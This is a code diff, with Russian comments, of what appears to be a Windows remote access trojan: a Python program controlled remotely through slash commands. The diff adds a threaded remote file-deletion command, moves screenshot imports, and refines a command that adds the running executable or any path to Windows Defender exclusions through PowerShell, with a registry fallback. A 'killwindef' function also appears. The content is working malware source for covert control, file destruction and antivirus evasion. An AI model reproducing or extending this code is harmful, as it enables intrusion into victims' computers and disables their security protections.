@@ -37,6 +37,10 @@ import threading
 import psutil
 import cv2
 import struct
+import win32ui
+import win32api
+from PIL import Image
+
 
 # Настройка логирования
 logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s', handlers=[logging.StreamHandler()])
@@ -133,7 +137,7 @@ RECONNECT_DELAY = 15
 # ====== Глобальные переменные ======
 
 # --- Версия и ограничения ---
-CURRENT_VERSION = 38
+CURRENT_VERSION = 39
 MAX_LEN = 4000
 
 # --- Пути ---
@@ -632,20 +636,98 @@ def cmd_mkdir(args):
         return f"❌ Ошибка: {str(e)}"
 
 
-def cmd_delete(args):
-    logger.debug(f"Выполняется /delete с аргументами: {args}")
-    try:
-        with file_lock:
-            path = os.path.join(current_path, args.strip())
-            if os.path.isdir(path):
-                shutil.rmtree(path, ignore_errors=True)
-            elif os.path.isfile(path):
-                os.remove(path)
-            else:
-                return "❌ Не найдено"
-            return "✅ Удалено"
-    except Exception as e:
-        return f"❌ Ошибка: {str(e)}"
+def cmd_delete(args, conn):
+    """
+    Удаляет файлы/папки в фоновом режиме. 
+    Включает в себя подсчет размера, объектов и обработку ошибок.
+    """
+    
+    # --- 1. Вложенная функция форматирования ---
+    def format_bytes(size):
+        power = 2**10
+        n = 0
+        labels = {0: 'B', 1: 'KB', 2: 'MB', 3: 'GB', 4: 'TB'}
+        while size > power and n < 4:
+            size /= power
+            n += 1
+        return f"{size:.2f} {labels[n]}"
+
+    # --- 2. Вложенный воркер для потока ---
+    def delete_worker(target, connection, original_arg):
+        deleted_size = 0
+        deleted_count = 0
+        errors_count = 0
+        
+        try:
+            if os.path.isfile(target):
+                try:
+                    f_size = os.path.getsize(target)
+                    os.remove(target)
+                    deleted_size += f_size
+                    deleted_count += 1
+                except:
+                    errors_count += 1
+
+            elif os.path.isdir(target):
+                for root, dirs, files in os.walk(target, topdown=False):
+                    for name in files:
+                        file_path = os.path.join(root, name)
+                        try:
+                            try: f_size = os.path.getsize(file_path)
+                            except: f_size = 0
+                            os.remove(file_path)
+                            deleted_size += f_size
+                            deleted_count += 1
+                        except:
+                            errors_count += 1
+                    
+                    for name in dirs:
+                        try:
+                            os.rmdir(os.path.join(root, name))
+                        except:
+                            errors_count += 1
+                
+                # Удаляем саму пустую оболочку папки
+                try:
+                    os.rmdir(target)
+                except:
+                    errors_count += 1
+
+            # Формируем итоговый отчет
+            status_emoji = "✅" if errors_count == 0 else "⚠️"
+            report = (
+                f"🗑 *Отчет об удалении*\n"
+                f"━━━━━━━━━━━━━━━\n"
+                f"📍 Объект: `{original_arg}`\n"
+                f"📦 Очищено: *{format_bytes(deleted_size)}*\n"
+                f"📄 Удалено: `{deleted_count}` объектов\n"
+                f"{status_emoji} Ошибки: `{errors_count}` шт."
+            )
+            
+            send_response(connection, report, cmd_name="/delete")
+
+        except Exception as e:
+            send_response(connection, f"❌ Ошибка потока удаления: {e}", cmd_name="/delete")
+
+    # --- 3. Основная логика входа ---
+    path_arg = args.strip()
+    if not path_arg:
+        return "⚠️ Не указан путь. Пример: `/delete logs`"
+
+    # Склеиваем путь с текущей директорией бота
+    target_full_path = os.path.abspath(os.path.join(current_path, path_arg))
+
+    if not os.path.exists(target_full_path):
+        return f"❌ Объект не найден: `{path_arg}`"
+
+    # Запускаем выполнение в отдельном потоке, чтобы клиент не висел
+    threading.Thread(
+        target=delete_worker, 
+        args=(target_full_path, conn, path_arg), 
+        daemon=True
+    ).start()
+
+    return f"⏳ Начинаю удаление `{path_arg}`... Результат придет сообщением."
 
 
 def cmd_rename(args):
@@ -729,10 +811,10 @@ def cmd_msg(args):
             user32.DestroyWindow(hwnd)
 
         threading.Thread(target=show_msgbox, daemon=True).start()
-        return "Готово"
+        return "✅ Готово"
     
     except Exception as e:
-        return f"Ошибка: {e}"
+        return f"❌ Ошибка: {e}"
 
 
 def cmd_grant(args):
@@ -1431,7 +1513,7 @@ def cmd_whereami(args):
             f"📍 *Информация о расположении:*\n\n"
             f"🔹 *Исполняемый файл (EXE):*\n`{exe_path}`\n\n"
             f"🔹 *Рабочий каталог:* {check_path(work_dir)}\n`{work_dir}`\n\n"
-            f"─── **МОДУЛЬНАЯ СИСТЕМА** ───\n\n"
+            f"─── *МОДУЛЬНАЯ СИСТЕМА* ───\n\n"
             f"🧩 *Папка модулей (.dat):* {check_path(plugins_dir)}\n"
             f"`{plugins_dir}`\n\n"
             f"📚 *Папка библиотек (libs):* {check_path(libs_dir)}\n"
@@ -1439,7 +1521,7 @@ def cmd_whereami(args):
             f"🌐 *В поиске Python (sys.path):* `{len(sys.path)} путей`"
         )
     except Exception as e:
-        return f"❌ **Ошибка при сборе путей:** `{e}`"
+        return f"❌ *Ошибка при сборе путей:* `{e}`"
 
 
 def cmd_restart(args):
@@ -2204,10 +2286,6 @@ def cmd_screenshot(args, conn):
             os.remove(temp_path)
 
 def cmd_screenshot_full(args, conn):
-    import win32gui, win32ui, win32con, win32api
-    import ctypes, os, uuid, tempfile
-    from PIL import Image
-
     temp_path = os.path.join(
         tempfile.gettempdir(),
         f"screen_full_{uuid.uuid4().hex}.png"
@@ -2911,22 +2989,24 @@ def cmd_download_link(args: str):
 def cmd_wd_exclude(args):
     """
     Добавляет текущий exe или указанный путь в исключения Windows Defender.
-    Без аргумента — текущий exe, с аргументом — любой файл/папка.
-    Работает с разными локалями и резервно через реестр.
     """
     try:
-        # Определяем путь
-        if not args.strip():
+        path_arg = args.strip().strip('"\'')
+        
+        # 1. Определяем целевой путь
+        if not path_arg:
             target_path = sys.executable
             logger.info("Добавляем текущий exe в исключения")
         else:
-            target_path = os.path.abspath(args.strip().strip('"\''))
+            target_path = path_arg if os.path.isabs(path_arg) else os.path.join(current_path, path_arg)
+            target_path = os.path.abspath(target_path)
             logger.info(f"Добавляем путь: {target_path}")
 
+        # 2. Проверка существования
         if not os.path.exists(target_path):
-            return f"Путь не существует: `{target_path}`"
+            return f"❌ Путь не существует: `{target_path}`"
 
-        # Экранирование для PowerShell
+        # 3. Экранирование для PowerShell
         escaped = target_path.replace('"', '`"')
 
         # PowerShell команда
@@ -2944,24 +3024,24 @@ def cmd_wd_exclude(args):
 
         output = (result.stdout + result.stderr).strip().upper()
         if "OK" in output or "ALREADY" in output:
-            return f"Добавлено в исключения Defender: `{os.path.basename(target_path)}`"
+            return f"✅ Добавлено в исключения Defender: `{os.path.basename(target_path)}`"
 
         # === Резерв через реестр ===
         try:
             key_path = r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
             with reg.CreateKeyEx(reg.HKEY_LOCAL_MACHINE, key_path, 0, reg.KEY_SET_VALUE) as key:
                 reg.SetValueEx(key, target_path, 0, reg.REG_DWORD, 0)
-            return f"Добавлено через реестр: `{os.path.basename(target_path)}`"
+            return f"✅ Добавлено через реестр: `{os.path.basename(target_path)}`"
         except PermissionError:
             logger.warning("Нет прав для записи в реестр")
         except Exception as e:
             logger.warning(f"Не удалось добавить через реестр: {e}")
 
-        return f"Не удалось добавить. Ответ PowerShell: {output[:500]}"
+        return f"❌ Не удалось добавить. Ответ PowerShell: {output[:500]}"
 
     except Exception as e:
         logger.error(f"Ошибка wd_exclude: {e}")
-        return f"Критическая ошибка: {e}"
+        return f"❌ Критическая ошибка: {e}"
 
 
 def cmd_killwindef(args):
@@ -3115,11 +3195,11 @@ def cmd_plugins_panel(args=None, conn=None):
         status = "🟢 `ON`" if info['active'] else "🔴 `OFF`"
         
         # Формируем карточку модуля
-        report += f"{status} **{info['real_name'].upper()}**\n"
+        report += f"{status} *{info['real_name'].upper()}*\n"
         report += f"ID: `{filename}`\n"
         report += f"ℹ️ {info['description']}\n\n"
     
-    report += "─── **УПРАВЛЕНИЕ** ───\n"
+    report += "─── *УПРАВЛЕНИЕ* ───\n"
     report += "• `/pl_on <ID>` — Включить\n"
     report += "• `/pl_off <ID>` — Выключить\n"
     report += "• `/pl_rm <ID>` — Удалить\n"
